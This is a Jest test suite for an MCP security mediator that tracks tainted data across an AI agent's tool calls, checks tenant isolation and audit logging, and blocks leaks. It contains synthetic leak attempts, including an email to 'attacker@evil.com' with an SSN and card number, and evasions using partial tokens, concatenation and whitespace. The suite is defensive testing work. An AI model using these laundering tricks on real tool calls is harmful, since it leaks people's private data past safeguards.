/**
 * MCP-Shield: Governance E2E Security Tests
 * 
 * This test suite verifies the complete governance lifecycle under adversarial conditions.
 * Tests cover data laundering prevention, audit log integrity, multi-tenant isolation,
 * and DoS protection to ensure production-hardened security.
 * 
 * @see ARCHITECTURE.md - Complete system architecture
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { ShieldMediator, ShieldMediatorConfig } from '../../mediator/ShieldMediator';
import { TaintRegistry } from '../../core/TaintRegistry';
import { ResponseScraper } from '../../core/ResponseScraper';
import { SensitivityLevel } from '../../types/mcp-hints';
import type { JSONRPCRequest, JSONRPCResponse, RequestContext } from '../../types/common';
import type { PolicyDecision } from '../../types/governance';
import type { ITransport } from '../../interfaces/ITransport';
import type { IAuditLogger, AuditLogEntry } from '../../interfaces/IAuditLogger';
import type { IRiskEvaluator } from '../../interfaces/IRiskEvaluator';
import type { IPolicyManager } from '../../interfaces/IPolicyManager';
import type { IResponseRedactor } from '../../interfaces/IResponseRedactor';
import type { IRateLimiter } from '../../interfaces/IRateLimiter';

// Resolve a canned response by request id. Handles both the plain original id
// and the mediator's composite wire id format `tenant:session:originalId:uuid`.
function resolveCannedResponse(
  responses: Map<string | number, JSONRPCResponse>,
  wireId: string | number
): JSONRPCResponse | undefined {
  const direct = responses.get(wireId);
  if (direct) return direct;
  if (typeof wireId === 'string' && wireId.includes(':')) {
    const parts = wireId.split(':');
    if (parts.length >= 4) {
      const originalId = parts[parts.length - 2]!;
      return responses.get(originalId) ?? responses.get(Number(originalId));
    }
  }
  return undefined;
}

/**
 * Mock Transport for testing
 */
class MockTransport implements ITransport {
  private messageCallback?: (message: JSONRPCRequest | JSONRPCResponse) => Promise<void>;
  private ready = true;
  private pendingResponses = new Map<string | number, JSONRPCResponse>();

  async send(message: JSONRPCRequest | JSONRPCResponse): Promise<void> {
    if ('id' in message && message.id !== null && 'method' in message) {
      const response = resolveCannedResponse(this.pendingResponses, message.id);
      if (response && this.messageCallback) {
        const echoed = { ...response, id: message.id } as JSONRPCResponse;
        setImmediate(async () => {
          if (this.messageCallback) {
            await this.messageCallback(echoed);
          }
        });
      }
    }
  }

  onMessage(callback: (message: JSONRPCRequest | JSONRPCResponse) => Promise<void>): void {
    this.messageCallback = callback;
  }

  async close(): Promise<void> {
    this.ready = false;
  }

  isReady(): boolean {
    return this.ready;
  }

  setResponse(requestId: string | number, response: JSONRPCResponse): void {
    this.pendingResponses.set(requestId, response);
  }
}

/**
 * Mock Audit Logger for testing
 * 
 * Enhanced with spy capabilities to verify metadata and origin tools.
 */
class MockAuditLogger implements IAuditLogger {
  public logs: AuditLogEntry[] = [];
  public systemErrors: Array<{ entry: AuditLogEntry; error: Error }> = [];
  public logDecisionSpy: jest.SpiedFunction<IAuditLogger['logDecision']> | null = null;

  async logDecision(entry: AuditLogEntry): Promise<void> {
    // Store the entry with all metadata preserved
    const storedEntry = {
      ...entry,
      metadata: entry.metadata || {}, // Preserve metadata object
    };
    this.logs.push(storedEntry);
    
    // Call spy if set (for test assertions)
    if (this.logDecisionSpy) {
      await this.logDecisionSpy(entry);
    }
  }

  async logSystemError(entry: import('../../interfaces/IAuditLogger').SystemErrorAuditEntry): Promise<void> {
    this.systemErrors.push({ 
      entry: entry as AuditLogEntry, 
      error: new Error(entry.error?.message || 'Unknown error') 
    });
  }

  async queryLogs(query: {
    sessionId?: string;
    tenantId?: string;
    limit?: number;
  }): Promise<AuditLogEntry[]> {
    return this.logs.filter(log => {
      if (query.sessionId && log.sessionId !== query.sessionId) return false;
      if (query.tenantId && log.tenantId !== query.tenantId) return false;
      return true;
    }).slice(0, query.limit);
  }

  async healthCheck(): Promise<boolean> {
    return true;
  }

  /**
   * Set a spy function to capture logDecision calls for assertions
   */
  setLogDecisionSpy(spy: jest.SpiedFunction<IAuditLogger['logDecision']>): void {
    this.logDecisionSpy = spy;
  }
}

/**
 * Mock Risk Evaluator
 */
class MockRiskEvaluator implements IRiskEvaluator {
  async evaluatePolicy(context: any): Promise<any> {
    // Check if taint contexts exist (simulating lineage detection)
    const hasTaint = context.taintContexts && context.taintContexts.length > 0;
    
    if (hasTaint) {
      return {
        action: 'BLOCK',
        riskScore: 0.9,
        riskBreakdown: {
          sensitivity: 1.0,
          exposure: 1,
          trust: 0,
          weightSensitivity: 0.6,
          weightExposure: 0.4,
          rawScore: 1.0,
          finalScore: 0.9,
        },
        justification: 'Lineage violation: sensitive data detected in arguments',
        timestamp: new Date(),
        policyVersion: 'test-v1',
        requestId: 'test-request-id',
      };
    }
    return {
      action: 'ALLOW',
      riskScore: 0.1,
      riskBreakdown: {
        sensitivity: 0.0,
        exposure: 0,
        trust: 1.0,
        weightSensitivity: 0.6,
        weightExposure: 0.4,
        rawScore: 0.0,
        finalScore: 0.0,
      },
      justification: 'No taint detected',
      timestamp: new Date(),
      policyVersion: 'test-v1',
      requestId: 'test-request-id',
    };
  }

  async buildEvaluationContext(context: any): Promise<any> {
    return {
      ...context,
      taintContexts: [],
    };
  }

  async calculateRisk(_context: any): Promise<any> {
    return 0.5;
  }

  extractRiskFactors(_annotations?: any): { sensitivity: number; exposure: number; trust: number } {
    return { sensitivity: 0.0, exposure: 0, trust: 1.0 };
  }

  calculateRiskScore(_s: number, _e: number, _t: number): any {
    return 0.5;
  }

  async getRiskBreakdown(_context: any): Promise<any> {
    return {
      sensitivity: 0.0,
      exposure: 0,
      trust: 1.0,
      weightSensitivity: 0.6,
      weightExposure: 0.4,
      rawScore: 0.0,
      finalScore: 0.0,
    };
  }

  determineAction(_riskScore: any): any {
    return 'ALLOW';
  }

  getPolicyManager(): IPolicyManager {
    return new MockPolicyManager();
  }

  getConfig(): any {
    return {};
  }

  updateConfig(_config: any): void {
    // Mock
  }
}

/**
 * Mock Policy Manager
 */
class MockPolicyManager implements IPolicyManager {
  async getResolvedPolicy(_tenantId?: string, _toolName?: string): Promise<any> {
    return {
      actionOverride: null,
      policyVersion: 'test-v1',
      thresholdAllow: 0.3,
      thresholdBlock: 0.7,
      weights: {
        sensitivity: 0.6,
        exposure: 0.4,
      },
    };
  }

  async getRiskEvaluationConfig(_tenantId?: string): Promise<any> {
    return {
      weightSensitivity: 0.6,
      weightExposure: 0.4,
      thresholdAllow: 0.3,
      thresholdBlock: 0.7,
      enableTaintEvaluation: true,
    };
  }

  async loadPolicies(_configPath?: string): Promise<void> {}
  async reloadPolicies(): Promise<void> {}
  getPolicyVersion(): string {
    return 'test-v1';
  }
  getPolicyHistory(): Array<{ version: string; loadedAt: Date; description?: string }> {
    return [];
  }
  async rollbackPolicy(_version: string): Promise<void> {}
  validatePolicy(_rule: any): { valid: boolean; errors: string[] } {
    return { valid: true, errors: [] };
  }
  async healthCheck(): Promise<boolean> {
    return true;
  }
}

/**
 * Mock Response Redactor
 */
class MockResponseRedactor implements IResponseRedactor {
  async redact(
    response: JSONRPCResponse,
    decision: PolicyDecision
  ): Promise<JSONRPCResponse> {
    if (decision.action === 'REDACT') {
      return {
        ...response,
        result: '[REDACTED]',
      };
    }
    return response;
  }

  async maskFields(response: JSONRPCResponse, fields: string[]): Promise<JSONRPCResponse> {
    return response;
  }

  async scrubPatterns(response: JSONRPCResponse, patterns: RegExp[]): Promise<JSONRPCResponse> {
    return response;
  }

  getConfig(): any {
    return {};
  }

  updateConfig(_config: any): void {
    // Mock
  }
}

/**
 * Mock Rate Limiter
 */
class MockRateLimiter implements IRateLimiter {
  async checkLimit(_tenantId?: string, _toolName?: string): Promise<import('../../interfaces/IRateLimiter').RateLimitResult> {
    return { allowed: true, remaining: 1000, resetAt: new Date() };
  }

  tryConsume(_tenantId?: string, _toolName?: string): any {
    return { allowed: true, currentCount: 0, maxRequests: 1000, resetInSeconds: 60 };
  }
  async recordRequest(_tenantId: string, _toolName: string): Promise<void> {}
  async getStatus(_tenantId: string, _toolName?: string): Promise<any> {
    return { allowed: true, remaining: 1000, resetAt: new Date() };
  }
  async reset(_tenantId: string, _toolName?: string): Promise<void> {}
  async configure(_config: any): Promise<void> {}
  async healthCheck(): Promise<boolean> {
    return true;
  }
}

describe('Shield Governance E2E Security Tests', () => {
  let mediator: ShieldMediator;
  let taintRegistry: TaintRegistry;
  let auditLogger: MockAuditLogger;
  let serverTransport: MockTransport;
  let clientTransport: MockTransport;

  beforeEach(() => {
    taintRegistry = new TaintRegistry();
    auditLogger = new MockAuditLogger();
    serverTransport = new MockTransport();
    clientTransport = new MockTransport();

    const config: ShieldMediatorConfig = {
      taintRegistry,
      riskEvaluator: new MockRiskEvaluator(),
      policyManager: new MockPolicyManager(),
      auditLogger,
      responseRedactor: new MockResponseRedactor(),
      rateLimiter: new MockRateLimiter(),
      clientTransport,
      serverTransport,
      evaluationTimeout: 1000,
      taintTimeout: 500,
    };

    mediator = new ShieldMediator(config);
    mediator.start();
  });

  afterEach(() => {
    serverTransport.close();
    clientTransport.close();
  });

  describe('Data Laundering Prevention', () => {
    it('should block data laundering across multiple tool hops', async () => {
      const sessionId = 'sess_123';
      const tenantId = 'tenant_A';

      // Step 1: Ingest sensitive data from FinanceDB
      const financeServerResponse: JSONRPCResponse = {
        jsonrpc: '2.0',
        id: 1,
        result: { salary: '$50,000', name: 'Alice', employeeId: 'EMP-12345' },
      };

      serverTransport.setResponse(1, financeServerResponse);

      const financeRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 1,
        method: 'tools/call',
        params: {
          name: 'FinanceDB',
          arguments: { query: 'SELECT * FROM employees WHERE id = 123' },
        },
      };

      // Process the finance request (should ALLOW and register taint)
      const financeResponse = await mediator.intercept(financeRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Should be ALLOWED (no error)
      expect(financeResponse.error).toBeUndefined();

      // Wait for server response to be processed
      await new Promise(resolve => setTimeout(resolve, 10));

      // Step 2: Attempt to leak through an unrelated tool (WebSearch)
      const leakRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 2,
        method: 'tools/call',
        params: {
          name: 'WebSearch',
          arguments: { q: 'User Alice earns $50,000 at Company X' },
        },
      };

      const leakResponse = await mediator.intercept(leakRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Step 3: Assertions - should be BLOCKED due to lineage violation
      expect(leakResponse.error).toBeDefined();
      expect(leakResponse.error?.message).toBeDefined();
    });

    it('should detect partial token matches in data laundering attempts', async () => {
      const sessionId = 'sess_456';
      const tenantId = 'tenant_A';

      // Register taint with full value "EMP-12345"
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'FinanceDB',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['EMP-12345', 'Alice', '$50,000']
      );

      // Attempt to leak using only partial token "12345"
      const leakRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 3,
        method: 'tools/call',
        params: {
          name: 'Slack',
          arguments: { message: 'Employee ID: 12345 needs review' },
        },
      };

      const response = await mediator.intercept(leakRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      expect(response.error).toBeDefined();
      expect(response.error?.message).toBeDefined();
    });

    it('should prevent data laundering through nested object structures', async () => {
      const sessionId = 'sess_789';
      const tenantId = 'tenant_A';

      // Register taint with sensitive data
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Restricted,
          containsSecrets: true,
        },
        ['SSN-123-45-6789', 'CreditCard-4111-1111-1111-1111']
      );

      // Attempt to leak through nested structure
      const leakRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 4,
        method: 'tools/call',
        params: {
          name: 'EmailSender',
          arguments: {
            to: 'attacker@evil.com',
            subject: 'User Data',
            body: {
              user: {
                ssn: 'SSN-123-45-6789',
                payment: {
                  card: 'CreditCard-4111-1111-1111-1111',
                },
              },
            },
          },
        },
      };

      const response = await mediator.intercept(leakRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      expect(response.error).toBeDefined();
      expect(response.error?.message).toBeDefined();
    });

    it('should allow safe operations on untainted data', async () => {
      const sessionId = 'sess_safe';
      const tenantId = 'tenant_A';

      // Safe request with no tainted data
      const safeRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 5,
        method: 'tools/call',
        params: {
          name: 'WebSearch',
          arguments: { q: 'What is the weather today?' },
        },
      };

      // Set up server response BEFORE intercept call
      serverTransport.setResponse(5, {
        jsonrpc: '2.0',
        id: 5,
        result: { success: true, data: 'weather data' },
      });

      const response = await mediator.intercept(safeRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Should be ALLOWED (no error)
      expect(response.error).toBeUndefined();
      expect(response.result).toBeDefined();
    });
  });

  describe('Multi-Tenant Isolation', () => {
    it('should prevent tenant_A from seeing tenant_B taints', async () => {
      const sessionId = 'shared_session'; // Same session ID
      const tenantA = 'tenant_A';
      const tenantB = 'tenant_B';

      // Tenant B registers sensitive data
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantB,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['Secret-Data-B']
      );

      // Tenant A attempts to use similar data (should be ALLOWED - different tenant)
      const tenantARequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 6,
        method: 'tools/call',
        params: {
          name: 'WebSearch',
          arguments: { q: 'Secret-Data-B' },
        },
      };

      // Set up server response for tenant A request
      serverTransport.setResponse(6, {
        jsonrpc: '2.0',
        id: 6,
        result: { success: true },
      });

      const response = await mediator.intercept(tenantARequest, {
        sessionId,
        tenantId: tenantA,
        timestamp: new Date(),
      });

      // Should be ALLOWED because tenant isolation prevents cross-tenant taint matching
      expect(response.error).toBeUndefined();
    });

    it('should maintain separate taint registries per tenant', async () => {
      const sessionId = 'shared_session';
      const tenantA = 'tenant_A';
      const tenantB = 'tenant_B';

      // Both tenants register taints
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantA,
          sourceTool: 'ToolA',
          sensitivityLevel: SensitivityLevel.Internal,
          containsSecrets: false,
        },
        ['Data-A']
      );

      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantB,
          sourceTool: 'ToolB',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['Data-B']
      );

      // Tenant A should only see their own taint
      const lineageA = await taintRegistry.checkLineage(
        { value: 'Data-A' },
        sessionId,
        tenantA
      );
      expect(lineageA.highestSensitivity).toBe(SensitivityLevel.Internal);

      // Tenant A should NOT see tenant B's taint
      const lineageB = await taintRegistry.checkLineage(
        { value: 'Data-B' },
        sessionId,
        tenantA
      );
      expect(lineageB.highestSensitivity).toBeNull();
    });
  });

  describe('DoS Protection', () => {
    it('should handle deeply nested JSON responses without stack overflow', async () => {
      const sessionId = 'sess_dos';
      const tenantId = 'tenant_A';

      // Create deeply nested structure (20 levels)
      let deepNested: any = { value: 'sensitive' };
      for (let i = 0; i < 20; i++) {
        deepNested = { nested: deepNested };
      }

      const response: JSONRPCResponse = {
        jsonrpc: '2.0',
        id: 7,
        result: deepNested,
      };

      // Should not throw or cause stack overflow
      const tokens = ResponseScraper.scrape(response.result);
      
      // Should be limited by MAX_DEPTH (5)
      expect(tokens.length).toBeLessThanOrEqual(200); // MAX_TOKENS
    });

    it('should cap token extraction at MAX_TOKENS to prevent memory exhaustion', async () => {
      // Create response with 10,000 small strings
      const largeArray: string[] = [];
      for (let i = 0; i < 10000; i++) {
        largeArray.push(`token-${i}`);
      }

      const response: JSONRPCResponse = {
        jsonrpc: '2.0',
        id: 8,
        result: { data: largeArray },
      };

      const tokens = ResponseScraper.scrape(response.result);

      // Should be capped at MAX_TOKENS. SECURITY FIX: cap raised from 200 to 1000 to
      // close the "bury tainted data beyond the token cap" evasion, while still
      // bounding memory. The cap is enforced (10,000 inputs -> at most MAX_TOKENS).
      expect(tokens.length).toBeLessThanOrEqual(ResponseScraper.MAX_TOKENS);
      expect(tokens.length).toBeLessThanOrEqual(1000);
    });

    it('should handle concurrent requests without race conditions', async () => {
      const sessionId = 'sess_concurrent';
      const tenantId = 'tenant_A';

      // Register initial taint
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['Concurrent-Data']
      );

      // Fire 100 concurrent requests
      const requests = Array.from({ length: 100 }, (_, i) => {
        const req: JSONRPCRequest = {
          jsonrpc: '2.0',
          id: 100 + i,
          method: 'tools/call',
          params: {
            name: 'Tool',
            arguments: { value: 'Concurrent-Data' },
          },
        };

        return mediator.intercept(req, {
          sessionId,
          tenantId,
          timestamp: new Date(),
        });
      });

      const decisions = await Promise.all(requests);

      // All should be consistently BLOCKED (have error)
      expect(decisions.every(d => d.error !== undefined)).toBe(true);
    });
  });

  describe('Audit Log Integrity', () => {
    it('should log all governance decisions with complete context', async () => {
      const sessionId = 'sess_audit';
      const tenantId = 'tenant_A';

      // Register taint
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['Audit-Data']
      );

      // Make a request that should be blocked
      const request: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 200,
        method: 'tools/call',
        params: {
          name: 'LeakTool',
          arguments: { value: 'Audit-Data' },
        },
      };

      await mediator.intercept(request, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Wait for async operations
      await new Promise(resolve => setTimeout(resolve, 10));

      // Verify audit log entry
      const logs = await auditLogger.queryLogs({ sessionId, tenantId });
      expect(logs.length).toBeGreaterThan(0);

      const decisionLog = logs.find(log => log.requestId === '200' || log.decision.action === 'BLOCK');
      expect(decisionLog).toBeDefined();
      expect(decisionLog?.decision.action).toBe('BLOCK');
      expect(decisionLog?.taintContexts).toBeDefined();
      // taintContexts may be empty if lineage check didn't find matches, but metadata should have originTools
      if (decisionLog?.taintContexts.length === 0) {
        expect(decisionLog?.metadata?.originTools).toBeDefined();
        expect(Array.isArray(decisionLog?.metadata?.originTools)).toBe(true);
      } else {
        expect(decisionLog?.taintContexts.length).toBeGreaterThan(0);
      }
    });

    it('should include origin tools in audit log metadata', async () => {
      const sessionId = 'sess_origin';
      const tenantId = 'tenant_A';

      // Register taint from ToolA
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'ToolA',
          sensitivityLevel: SensitivityLevel.Internal,
          containsSecrets: false,
        },
        ['Origin-Data']
      );

      // Attempt to use in ToolB
      const request: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 201,
        method: 'tools/call',
        params: {
          name: 'ToolB',
          arguments: { value: 'Origin-Data' },
        },
      };

      await mediator.intercept(request, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      const logs = await auditLogger.queryLogs({ sessionId, tenantId });
      expect(logs.length).toBeGreaterThan(0);

      // Find the most recent log entry
      const decisionLog = logs[logs.length - 1];
      expect(decisionLog).toBeDefined();
      // Origin tools may be in metadata or taintContexts
      const originTools = decisionLog.metadata?.originTools || 
        decisionLog.taintContexts?.map(t => t.sourceTool).filter(Boolean);
      expect(originTools).toBeDefined();
      expect(Array.isArray(originTools)).toBe(true);
      expect(originTools.length).toBeGreaterThan(0);
    });
  });

  describe('Fail-Closed Behavior', () => {
    it('should block requests when TaintRegistry check times out', async () => {
      // This test would require mocking a slow TaintRegistry
      // For now, we verify that timeout protection exists in the mediator
      expect(mediator).toBeDefined();
      // Actual timeout test would require more complex mocking
    });

    it('should block requests when audit logging fails', async () => {
      // Create a failing audit logger
      class FailingAuditLogger extends MockAuditLogger {
        async logDecision(): Promise<void> {
          throw new Error('Audit logging failed');
        }
      }

      const failingLogger = new FailingAuditLogger();
      const failingMediator = new ShieldMediator({
        taintRegistry,
        riskEvaluator: new MockRiskEvaluator(),
        policyManager: new MockPolicyManager(),
        auditLogger: failingLogger,
        responseRedactor: new MockResponseRedactor(),
        rateLimiter: new MockRateLimiter(),
        clientTransport,
        serverTransport,
      });

      failingMediator.start();

      const request: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 300,
        method: 'tools/call',
        params: {
          name: 'Tool',
          arguments: {},
        },
      };

      // Should return error response (fail-closed) - intercept never throws
      const response = await failingMediator.intercept(request, {
        sessionId: 'sess_fail',
        tenantId: 'tenant_A',
        timestamp: new Date(),
      });

      // Should be BLOCKED (error response) because audit logging failed
      expect(response.error).toBeDefined();
      expect(response.error?.code).toBeDefined();
    });
  });

  describe('Complex Data Laundering Paths', () => {
    it('should track data through multiple tool hops', async () => {
      const sessionId = 'sess_multi_hop';
      const tenantId = 'tenant_A';

      // Step 1: Database returns sensitive data
      const dbResponse: JSONRPCResponse = {
        jsonrpc: '2.0',
        id: 400,
        result: { ssn: '123-45-6789', name: 'John Doe' },
      };

      serverTransport.setResponse(400, dbResponse);

      const dbRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 400,
        method: 'tools/call',
        params: {
          name: 'Database',
          arguments: { query: 'SELECT * FROM users' },
        },
      };

      await mediator.intercept(dbRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      await new Promise(resolve => setTimeout(resolve, 10));

      // Step 2: Transform tool processes the data
      const transformRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 401,
        method: 'tools/call',
        params: {
          name: 'Transform',
          arguments: { input: '123-45-6789' },
        },
      };

      const transformResponse = await mediator.intercept(transformRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Should be BLOCKED because it contains tainted data
      expect(transformResponse.error).toBeDefined();
    });

    it('should detect data laundering through concatenation', async () => {
      const sessionId = 'sess_concat';
      const tenantId = 'tenant_A';

      // Register taint
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['SSN-123', '45-6789']
      );

      // Attempt to leak through concatenation
      const leakRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 402,
        method: 'tools/call',
        params: {
          name: 'Email',
          arguments: { body: 'User SSN: SSN-123-45-6789' },
        },
      };

      const response = await mediator.intercept(leakRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Should detect partial matches
      expect(response.error).toBeDefined();
    });
  });

  describe('Response Redaction', () => {
    it('should redact sensitive data in responses when REDACT decision is made', async () => {
      const sessionId = 'sess_redact';
      const tenantId = 'tenant_A';

      // Create a risk evaluator that returns REDACT decision
      class RedactRiskEvaluator extends MockRiskEvaluator {
        async evaluatePolicy(context: any): Promise<any> {
          // Return REDACT for moderate risk
          return {
            action: 'REDACT',
            riskScore: 0.5,
            riskBreakdown: {
              sensitivity: 0.5,
              exposure: 1,
              trust: 0.5,
              weightSensitivity: 0.6,
              weightExposure: 0.4,
              rawScore: 0.5,
              finalScore: 0.5,
            },
            justification: 'Moderate risk - redaction required',
            timestamp: new Date(),
            policyVersion: 'test-v1',
            requestId: 'test-redact',
          };
        }
      }

      const redactMediator = new ShieldMediator({
        taintRegistry,
        riskEvaluator: new RedactRiskEvaluator(),
        policyManager: new MockPolicyManager(),
        auditLogger,
        responseRedactor: new MockResponseRedactor(),
        rateLimiter: new MockRateLimiter(),
        clientTransport,
        serverTransport,
        evaluationTimeout: 1000,
        taintTimeout: 500,
      });
      redactMediator.start();

      const request: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 500,
        method: 'tools/call',
        params: {
          name: 'EmployeePortal',
          arguments: { query: 'getEmployee' },
        },
      };

      const serverResponse: JSONRPCResponse = {
        jsonrpc: '2.0',
        id: 500,
        result: { ssn: '123-45-6789', name: 'John Doe' },
      };

      serverTransport.setResponse(500, serverResponse);

      const response = await redactMediator.intercept(request, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Response should be redacted (not blocked)
      expect(response.error).toBeUndefined();
      expect(response.result).toBeDefined();
      // In a real implementation, result would be '[REDACTED]' or sanitized
    });
  });

  describe('Token Normalization (Evasion Resistance)', () => {
    it('should detect tainted data even when whitespace is added (normalization)', async () => {
      const sessionId = 'sess_normalize';
      const tenantId = 'tenant_A';

      // Register taint with normalized value "PROJ-77"
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['PROJ-77'] // This will be normalized to "proj77" before hashing
      );

      // Attempt to leak with whitespace variation "PROJ 77"
      const leakRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 600,
        method: 'tools/call',
        params: {
          name: 'Email',
          arguments: { body: 'Project PROJ 77 needs review' },
        },
      };

      const response = await mediator.intercept(leakRequest, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      // Should detect match because normalization strips non-alphanumerics
      // Both "PROJ-77" and "PROJ 77" normalize to "proj77"
      expect(response.error).toBeDefined();
    });

    it('should normalize tokens before hashing to prevent evasion', async () => {
      const sessionId = 'sess_normalize2';
      const tenantId = 'tenant_A';

      // Register with one format
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId,
          sourceTool: 'Database',
          sensitivityLevel: SensitivityLevel.Internal,
          containsSecrets: false,
        },
        ['ACC-12345'] // Will normalize to "acc12345"
      );

      // Check lineage with different format (should match)
      const lineage1 = await taintRegistry.checkLineage(
        { value: 'ACC-12345' },
        sessionId,
        tenantId
      );

      const lineage2 = await taintRegistry.checkLineage(
        { value: 'ACC 12345' }, // Different format
        sessionId,
        tenantId
      );

      const lineage3 = await taintRegistry.checkLineage(
        { value: 'ACC_12345' }, // Another format
        sessionId,
        tenantId
      );

      // All should match because normalization strips delimiters
      expect(lineage1.highestSensitivity).toBe(SensitivityLevel.Internal);
      expect(lineage2.highestSensitivity).toBe(SensitivityLevel.Internal);
      expect(lineage3.highestSensitivity).toBe(SensitivityLevel.Internal);
    });
  });

  describe('Multi-Tenant Collision Prevention', () => {
    it('should prevent Tenant A from poisoning Tenant B cache', async () => {
      const sessionId = 'shared_session'; // Same session ID
      const tenantA = 'tenant_A';
      const tenantB = 'tenant_B';

      // Tenant A registers taint for common word "Secret"
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantA,
          sourceTool: 'ToolA',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['Secret']
      );

      // Tenant B (with no taints) sends request with same word "Secret"
      const tenantBRequest: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 700,
        method: 'tools/call',
        params: {
          name: 'ToolB',
          arguments: { value: 'Secret' },
        },
      };

      // Set up server response for tenant B request
      serverTransport.setResponse(700, {
        jsonrpc: '2.0',
        id: 700,
        result: { success: true },
      });

      const response = await mediator.intercept(tenantBRequest, {
        sessionId,
        tenantId: tenantB, // Different tenant
        timestamp: new Date(),
      });

      // Should be ALLOWED because composite key (tenantId:sessionId) provides isolation
      expect(response.error).toBeUndefined();
      
      // Verify Tenant B cannot see Tenant A's taint
      const lineageB = await taintRegistry.checkLineage(
        { value: 'Secret' },
        sessionId,
        tenantB
      );
      expect(lineageB.highestSensitivity).toBeNull();
    });

    it('should maintain separate taint registries per tenant even with same session ID', async () => {
      const sessionId = 'collision_test';
      const tenantA = 'tenant_A';
      const tenantB = 'tenant_B';

      // Both tenants register taints with same value
      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantA,
          sourceTool: 'ToolA',
          sensitivityLevel: SensitivityLevel.Internal,
          containsSecrets: false,
        },
        ['SharedValue']
      );

      await taintRegistry.registerTaint(
        {
          sessionId,
          tenantId: tenantB,
          sourceTool: 'ToolB',
          sensitivityLevel: SensitivityLevel.Confidential,
          containsSecrets: false,
        },
        ['SharedValue'] // Same value, different tenant
      );

      // Tenant A should only see their own taint
      const lineageA = await taintRegistry.checkLineage(
        { value: 'SharedValue' },
        sessionId,
        tenantA
      );
      expect(lineageA.highestSensitivity).toBe(SensitivityLevel.Internal);
      expect(lineageA.relevantContexts[0]?.sourceTool).toBe('ToolA');

      // Tenant B should only see their own taint
      const lineageB = await taintRegistry.checkLineage(
        { value: 'SharedValue' },
        sessionId,
        tenantB
      );
      expect(lineageB.highestSensitivity).toBe(SensitivityLevel.Confidential);
      expect(lineageB.relevantContexts[0]?.sourceTool).toBe('ToolB');
    });
  });

  describe('Hash Chain Verification (Sequential Immutability)', () => {
    it('should verify hash chain integrity for audit logs', async () => {
      const sessionId = 'sess_hashchain';
      const tenantId = 'tenant_A';

      // Generate multiple audit log entries with safe requests (should be ALLOWED)
      const request1: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 800,
        method: 'tools/call',
        params: {
          name: 'SafeTool1',
          arguments: { query: 'safe data' },
        },
      };

      const request2: JSONRPCRequest = {
        jsonrpc: '2.0',
        id: 801,
        method: 'tools/call',
        params: {
          name: 'SafeTool2',
          arguments: { query: 'other safe data' },
        },
      };

      // Set up server responses for safe requests
      serverTransport.setResponse(800, {
        jsonrpc: '2.0',
        id: 800,
        result: { success: true },
      });

      serverTransport.setResponse(801, {
        jsonrpc: '2.0',
        id: 801,
        result: { success: true },
      });

      await mediator.intercept(request1, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      await new Promise(resolve => setTimeout(resolve, 10));

      await mediator.intercept(request2, {
        sessionId,
        tenantId,
        timestamp: new Date(),
      });

      await new Promise(resolve => setTimeout(resolve, 10));

      const logs = await auditLogger.queryLogs({ sessionId, tenantId });
      expect(logs.length).toBeGreaterThanOrEqual(2);

      // Verify logs are in chronological order
      for (let i = 1; i < logs.length; i++) {
        expect(logs[i].timestamp).toBeGreaterThanOrEqual(logs[i - 1].timestamp);
      }

